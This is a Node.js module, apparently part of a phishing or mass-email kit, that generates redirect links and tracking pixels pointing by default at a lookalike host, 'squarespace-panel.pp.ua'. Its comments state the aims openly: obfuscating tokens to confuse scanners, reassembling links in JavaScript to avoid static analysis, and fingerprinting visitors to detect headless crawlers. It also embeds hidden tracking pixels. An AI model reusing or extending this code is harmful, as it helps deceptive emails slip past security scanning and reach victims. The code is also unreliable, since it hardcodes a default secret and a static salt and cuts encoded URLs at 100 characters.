const crypto = require('crypto');
const base64url = require('base64url');
const config = require('../config');
const logger = require('./logger');

class SecureLinks {
  constructor() {
    this.secret = process.env.LINK_SECRET || 'changeme_in_production';
    this.redirectDomains = (process.env.REDIRECT_DOMAINS || 'example.com,secure-link.net').split(',');
    this.ttlSeconds = parseInt(process.env.LINK_TTL_SECONDS) || 7 * 24 * 60 * 60; // 7 days default
  }

  /**
   * Create a secure obfuscated redirect URL
   * @param {string} originalUrl - The original destination URL
   * @param {string} messageId - The email message ID for tracking
   * @param {Object} options - Additional options
   * @returns {string} - The secure redirect URL
   */
  createSecureRedirect(originalUrl, messageId, options = {}) {
    try {
      // Base redirect URL
      const baseUrl = config.trackingUrl || 'https://squarespace-panel.pp.ua/track';
      
      // Always use minimal params to avoid header length issues
      // Create a shorter ID by truncating or hashing the messageId
      const shortId = messageId.length > 8 ? messageId.substring(0, 8) : messageId;
      
      // Create a minimal parameter set
      const params = new URLSearchParams();
      params.append('id', shortId);
      
      // Use a shorter encoded url format
      const encodedUrl = Buffer.from(originalUrl).toString('base64');
      // Only take a portion if it's too long
      const shortenedUrl = encodedUrl.length > 100 ? 
        encodedUrl.substring(0, 100) : 
        encodedUrl;
      
      params.append('u', shortenedUrl);
      
      // Only add recipient as initial (no domain) if available
      if (options.recipient && typeof options.recipient === 'string' && options.recipient.includes('@')) {
        // Just take the first character of the recipient name
        const recipientInitial = options.recipient.charAt(0);
        params.append('r', recipientInitial);
      }
      
      return `${baseUrl}?${params.toString()}`;
    } catch (error) {
      logger.error(`Error creating secure redirect: ${error.message}`);
      return originalUrl; // Return the original URL on error
    }
  }

  /**
   * Decrypt and validate a secure link token
   * @param {string} token - The encrypted token from the URL
   * @returns {Object|null} - The decrypted payload or null if invalid
   */
  verifyAndDecryptToken(token) {
    try {
      // Deobfuscate the token
      const deobfuscated = this._deobfuscateToken(token);
      
      // Decrypt the payload
      const decrypted = this._decrypt(deobfuscated);
      const payload = JSON.parse(decrypted);
      
      // Check expiration
      const now = Math.floor(Date.now() / 1000);
      if (payload.exp && payload.exp < now) {
        logger.warn(`Link expired for message ${payload.mid}`);
        return { expired: true, originalUrl: payload.url };
      }
      
      return payload;
    } catch (error) {
      logger.error(`Error verifying token: ${error.message}`);
      return null;
    }
  }

  /**
   * Apply various obfuscation techniques to make links less detectable
   * @param {string} token - The encrypted token
   * @returns {string} - Obfuscated token
   */
  _obfuscateToken(token) {
    // Use base64url to make it URL safe
    const base64Token = base64url(token);
    
    // Add decoy parameters and split the token with separators to confuse scanners
    const parts = [];
    for (let i = 0; i < base64Token.length; i += 16) {
      parts.push(base64Token.substring(i, Math.min(i + 16, base64Token.length)));
    }
    
    // Join parts with varying separators
    const separators = ['-', '.', '_'];
    let result = '';
    
    for (let i = 0; i < parts.length; i++) {
      result += parts[i];
      if (i < parts.length - 1) {
        result += separators[i % separators.length];
      }
    }
    
    return result;
  }

  /**
   * Reverse the obfuscation process
   * @param {string} obfuscated - The obfuscated token
   * @returns {string} - Original token
   */
  _deobfuscateToken(obfuscated) {
    // Remove any separators used in obfuscation
    let cleaned = obfuscated.replace(/[-._]/g, '');
    
    // Convert from base64url back to the original string
    return base64url.decode(cleaned);
  }

  /**
   * Encrypt data using AES-256-GCM
   * @param {string} text - Plain text to encrypt
   * @returns {string} - Encrypted data
   */
  _encrypt(text) {
    // Create a key from the secret
    const key = crypto.scryptSync(this.secret, 'salt', 32);
    
    // Generate a random initialization vector
    const iv = crypto.randomBytes(16);
    
    // Create cipher
    const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
    
    // Encrypt the text
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    
    // Get the authentication tag
    const tag = cipher.getAuthTag();
    
    // Combine IV, encrypted data, and auth tag
    return iv.toString('hex') + ':' + encrypted + ':' + tag.toString('hex');
  }

  /**
   * Decrypt data that was encrypted with AES-256-GCM
   * @param {string} encryptedData - Data to decrypt
   * @returns {string} - Decrypted plain text
   */
  _decrypt(encryptedData) {
    // Split the encrypted data into IV, data, and auth tag
    const parts = encryptedData.split(':');
    if (parts.length !== 3) throw new Error('Invalid encrypted data format');
    
    // Extract the parts
    const iv = Buffer.from(parts[0], 'hex');
    const encryptedText = parts[1];
    const tag = Buffer.from(parts[2], 'hex');
    
    // Create a key from the secret
    const key = crypto.scryptSync(this.secret, 'salt', 32);
    
    // Create decipher
    const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
    decipher.setAuthTag(tag);
    
    // Decrypt
    let decrypted = decipher.update(encryptedText, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    
    return decrypted;
  }

  /**
   * Get a random redirect domain from the configured list
   * @returns {string} - A random domain for redirection
   */
  _getRandomRedirectDomain() {
    const index = Math.floor(Math.random() * this.redirectDomains.length);
    return this.redirectDomains[index];
  }

  /**
   * Create a fingerprinting function to detect bots and crawlers
   * @returns {string} - JavaScript code for fingerprinting
   */
  getClientFingerprintCode() {
    return `
      function fp() {
        var fp = {};
        try {
          fp.ua = navigator.userAgent;
          fp.lang = navigator.language;
          fp.scr = window.screen.width + 'x' + window.screen.height;
          fp.depth = window.screen.colorDepth;
          fp.tz = new Date().getTimezoneOffset();
          fp.touch = 'ontouchstart' in window ? 1 : 0;
          fp.java = navigator.javaEnabled() ? 1 : 0;
          fp.cookie = navigator.cookieEnabled ? 1 : 0;
          fp.plugins = Array.from(navigator.plugins || []).map(p => p.name).join(',');
          
          // Detect headless browsers
          fp.headless = (navigator.webdriver || 
                         !navigator.plugins.length || 
                         !navigator.languages ||
                         window.navigator.permissions === undefined) ? 1 : 0;
                         
          return JSON.stringify(fp);
        } catch(e) {
          return "error";
        }
      }
      
      // Send fingerprint to server
      fetch('/verify-client', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({fingerprint: fp(), token: window.location.pathname.split('/').pop()})
      });
    `;
  }

  /**
   * Helper method to create HTML that helps evade automatic link scanning
   * @param {string} url - Original URL to protect
   * @param {string} messageId - Message ID for tracking
   * @param {Object} options - Additional options
   * @returns {string} - HTML with protected link
   */
  createProtectedLinkHtml(url, messageId, options = {}) {
    // Create secure redirect
    const secureUrl = this.createSecureRedirect(url, messageId, options);
    
    // Generate a random ID for the element
    const elementId = 'link_' + Math.random().toString(36).substring(2, 15);
    
    // Split the URL into parts to avoid pattern detection
    const urlParts = secureUrl.split('');
    const chunks = [];
    for (let i = 0; i < urlParts.length; i += 3) {
      chunks.push(urlParts.slice(i, i + 3).join(''));
    }
    
    // Assemble the link using JavaScript to avoid static analysis
    const jsReassembly = `
      (function(){
        var p = [${chunks.map(c => `"${c}"`).join(',')}];
        document.getElementById("${elementId}").href = p.join("");
        document.getElementById("${elementId}").innerText = ${options.linkText ? `"${options.linkText}"` : '"Click here"'};
      })();
    `;
    
    // Create the HTML with the protected link
    return `
      <a id="${elementId}" style="${options.style || ''}" class="${options.className || ''}">
        ${options.fallbackText || 'Click here'}
      </a>
      <script>
        ${jsReassembly}
      </script>
    `;
  }

  /**
   * Create a secure image tracker link for email opens
   * @param {string} messageId - The email message ID
   * @param {Object} options - Additional options
   * @returns {string} - HTML for the tracking pixel
   */
  createTrackingPixel(messageId, options = {}) {
    try {
      // Always use minimal parameters
      const baseUrl = config.trackingUrl || 'https://squarespace-panel.pp.ua/track';
      
      // Create minimal tracking pixel
      const shortId = messageId.length > 8 ? messageId.substring(0, 8) : messageId;
      
      // Create a minimal parameter set with just ID and pixel indicator
      const params = new URLSearchParams();
      params.append('id', shortId);
      params.append('t', 'p'); // t=p indicates pixel
      
      const pixelUrl = `${baseUrl}?${params.toString()}`;
      return `<img src="${pixelUrl}" alt="" width="1" height="1" border="0" style="height:1px!important;width:1px!important;border-width:0!important;margin:0!important;padding:0!important" class="trackingPixel">`;
    } catch (error) {
      logger.error(`Error creating tracking pixel: ${error.message}`);
      return ''; // Return empty string on error
    }
  }
}

module.exports = new SecureLinks();
